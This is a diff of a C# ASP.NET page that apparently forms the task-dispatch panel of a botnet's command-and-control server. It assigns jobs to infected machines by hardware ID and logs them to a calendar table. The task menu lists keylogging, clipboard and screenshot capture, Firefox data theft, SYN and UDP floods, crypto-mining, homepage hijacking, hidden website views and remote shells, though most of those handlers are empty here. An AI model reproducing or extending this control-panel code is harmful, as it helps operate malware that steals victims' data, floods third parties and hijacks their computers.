@@ -14,6 +14,7 @@ public partial class Tasks : System.Web.UI.Page
     {
         using (SqlConnection conn = new SqlConnection(Settings.sqlConn))
         {
+
             conn.Open();
             int onnlineNow;
             int connToday;
@@ -77,7 +78,7 @@ public partial class Tasks : System.Web.UI.Page
             {
                 int TaskID = 0;
                 int online = 0;
-                using (SqlCommand cmd = new SqlCommand("select TaskID from(select TaskID,DENSE_RANK() over (order by HWID) as rownum from Tasks) as tbl where tbl.rownum = @i", conn))
+                using (SqlCommand cmd = new SqlCommand("select TaskID from(select TaskID,DENSE_RANK() over (order by TaskID) as rownum from Tasks) as tbl where tbl.rownum = @i", conn))
                 {
                     cmd.Parameters.AddWithValue("i", i);
                     TaskID = (int)cmd.ExecuteScalar();
@@ -249,7 +250,6 @@ public partial class Tasks : System.Web.UI.Page
                             cmd.ExecuteNonQuery();
                             cmd.Parameters.Clear();
                         }
-                        lblConnectionsWeekText.Text = CTask.ToString();
                     }
 
                     RegisterBots();
@@ -268,49 +268,73 @@ public partial class Tasks : System.Web.UI.Page
         {
             conn.Open();
             int TaskID = 0;
+            int user = 0;
 
-            using (SqlCommand cmd = new SqlCommand("SELECT TaskID FROM Tasks ORDER BY TaskID DESC;", conn))
+            using (SqlCommand cmd = new SqlCommand("SELECT TaskID FROM calender ORDER BY TaskID DESC;", conn))
             {
                 TaskID = Convert.ToInt32(cmd.ExecuteScalar());
                 TaskID++;
             }
 
-            for (int i = 1; i <= amount; i++)
+            using (SqlCommand cmd = new SqlCommand("SELECT UserID from Users where Username = @Username",conn))
             {
-                int Amount = 0;
-
-                using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Tasks WHERE HWID = @HWID and Type = @Type", conn))
+                cmd.Parameters.AddWithValue("Username", Session["Username"].ToString());
+                user = (int)cmd.ExecuteScalar();
+                cmd.Parameters.Clear();
+            }
+                for (int i = 1; i <= amount; i++)
                 {
-                    cmd.Parameters.AddWithValue("HWID", Bots[i]);
-                    cmd.Parameters.AddWithValue("Type", Task);
-                    Amount = (int)cmd.ExecuteScalar();
-                    cmd.Parameters.Clear();
-                }
+                    int Amount = 0;
 
-                if (Amount < 1)
-                {
-                    using (SqlCommand cmd = new SqlCommand("INSERT INTO Tasks VALUES (@TaskID,@UserID, @Type, @Parameter1, @Parameter2, @Parameter3, @Parameter4, @Max, @Running, @Filter, @Status, @HWID)", conn))
+                    using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Tasks WHERE HWID = @HWID and Type = @Type", conn))
                     {
-                        cmd.Parameters.AddWithValue("TaskID", TaskID);
-                        cmd.Parameters.AddWithValue("UserID", "15");
-                        cmd.Parameters.AddWithValue("Type", Task);
-                        cmd.Parameters.AddWithValue("Parameter1", txtPar1.Text);
-                        cmd.Parameters.AddWithValue("Parameter2", txtPar2.Text);
-                        cmd.Parameters.AddWithValue("Parameter3", txtPar3.Text);
-                        cmd.Parameters.AddWithValue("Parameter4", txtPar4.Text);
-                        cmd.Parameters.AddWithValue("Max", amount);
-                        cmd.Parameters.AddWithValue("Running", amount);
-                        cmd.Parameters.AddWithValue("Filter", where);
-                        cmd.Parameters.AddWithValue("Status", "Enabled");
                         cmd.Parameters.AddWithValue("HWID", Bots[i]);
-                        cmd.ExecuteNonQuery();
+                        cmd.Parameters.AddWithValue("Type", Task);
+                        Amount = (int)cmd.ExecuteScalar();
                         cmd.Parameters.Clear();
                     }
+
+                    if (Amount < 1)
+                    {
+                        using (SqlCommand cmd = new SqlCommand("INSERT INTO Tasks VALUES (@TaskID,@UserID, @Type, @Parameter1, @Parameter2, @Parameter3, @Parameter4, @Max, @Running, @Filter, @Status, @HWID,@Start)", conn))
+                        {
+                            cmd.Parameters.AddWithValue("TaskID", TaskID);
+                            cmd.Parameters.AddWithValue("UserID", user);
+                            cmd.Parameters.AddWithValue("Type", Task);
+                            cmd.Parameters.AddWithValue("Parameter1", txtPar1.Text);
+                            cmd.Parameters.AddWithValue("Parameter2", txtPar2.Text);
+                            cmd.Parameters.AddWithValue("Parameter3", txtPar3.Text);
+                            cmd.Parameters.AddWithValue("Parameter4", txtPar4.Text);
+                            cmd.Parameters.AddWithValue("Max", amount);
+                            cmd.Parameters.AddWithValue("Running", amount);
+                            cmd.Parameters.AddWithValue("Filter", where);
+                            cmd.Parameters.AddWithValue("Status", "Enabled");
+                            cmd.Parameters.AddWithValue("HWID", Bots[i]);
+                            cmd.Parameters.AddWithValue("Start", Settings.getDate());
+                            cmd.ExecuteNonQuery();
+                            cmd.Parameters.Clear();
+                        }
+                    }
+                    else
+                    {
+                        lblError.Text = "One or more bots could not be added cause they are already performing this particular task";
+                    }
                 }
-                else
-                {
-                    lblError.Text = "One or more bots could not be added cause they are already performing this particular task";
-                }
+
+            using (SqlCommand cmd = new SqlCommand("INSERT INTO Calender VALUES (@TaskID,@UserID, @Type, @Parameter1, @Parameter2, @Parameter3, @Parameter4, @Max, @Start,@Ending)", conn))
+            {
+                cmd.Parameters.AddWithValue("TaskID", TaskID);
+                cmd.Parameters.AddWithValue("UserID", user);
+                cmd.Parameters.AddWithValue("Type", Task);
+                cmd.Parameters.AddWithValue("Parameter1", txtPar1.Text);
+                cmd.Parameters.AddWithValue("Parameter2", txtPar2.Text);
+                cmd.Parameters.AddWithValue("Parameter3", txtPar3.Text);
+                cmd.Parameters.AddWithValue("Parameter4", txtPar4.Text);
+                cmd.Parameters.AddWithValue("Max", amount);
+                cmd.Parameters.AddWithValue("Start", Settings.getDate());
+                cmd.Parameters.AddWithValue("Ending", Settings.getDate());
+                cmd.ExecuteNonQuery();
+                cmd.Parameters.Clear();
             }
             Array.Clear(Bots, 0, Bots.Length);
         }
@@ -364,6 +388,13 @@ public partial class Tasks : System.Web.UI.Page
                     }
                 }
 
+                using (SqlCommand cmd = new SqlCommand("UPDATE Calender SET Ending = @Ending where TaskID = @TaskID", conn))
+                {
+                    cmd.Parameters.AddWithValue("Ending", Settings.getDate());
+                    cmd.Parameters.AddWithValue("TaskID", TaskID);
+                    cmd.ExecuteNonQuery();
+                }
+
                 using (SqlCommand cmd = new SqlCommand("DELETE FROM Tasks WHERE TaskID = @TaskID", conn))
                 {
                     cmd.Parameters.AddWithValue("TaskID", TaskID);
@@ -413,11 +444,9 @@ public partial class Tasks : System.Web.UI.Page
 
         if (ddTask.SelectedValue == "clipboard")
         {
-
         }
         else if (ddTask.SelectedValue == "screenshot")
         {
-
         }
         else if (ddTask.SelectedValue == "http")
         {
@@ -438,19 +467,15 @@ public partial class Tasks : System.Web.UI.Page
         }
         else if (ddTask.SelectedValue == "syn")
         {
-
         }
         else if (ddTask.SelectedValue == "udp")
         {
-
         }
         else if (ddTask.SelectedValue == "download")
         {
-
         }
         else if (ddTask.SelectedValue == "firefox")
         {
-
         }
         else if (ddTask.SelectedValue == "homepage")
         {
@@ -461,23 +486,18 @@ public partial class Tasks : System.Web.UI.Page
         }
         else if (ddTask.SelectedValue == "keylogger")
         {
-
         }
         else if (ddTask.SelectedValue == "mine")
         {
-
         }
         else if (ddTask.SelectedValue == "cleanse")
         {
-
         }
         else if (ddTask.SelectedValue == "update")
         {
-
         }
         else if (ddTask.SelectedValue == "uninstall")
         {
-
         }
         else if (ddTask.SelectedValue == "viewhidden")
         {
@@ -489,17 +509,15 @@ public partial class Tasks : System.Web.UI.Page
         else if (ddTask.SelectedValue == "viewvisable")
         {
             txtPar1.Visible = true;
-            txtPar1.Attributes.Add("placeholder","Direct link to website");
+            txtPar1.Attributes.Add("placeholder", "Direct link to website");
             lblPar1.Visible = true;
             lblPar1.Text = "Website";
         }
         else if (ddTask.SelectedValue == "shellhidden")
         {
-
         }
         else if (ddTask.SelectedValue == "shellvisable")
         {
-
         }
     }
 }
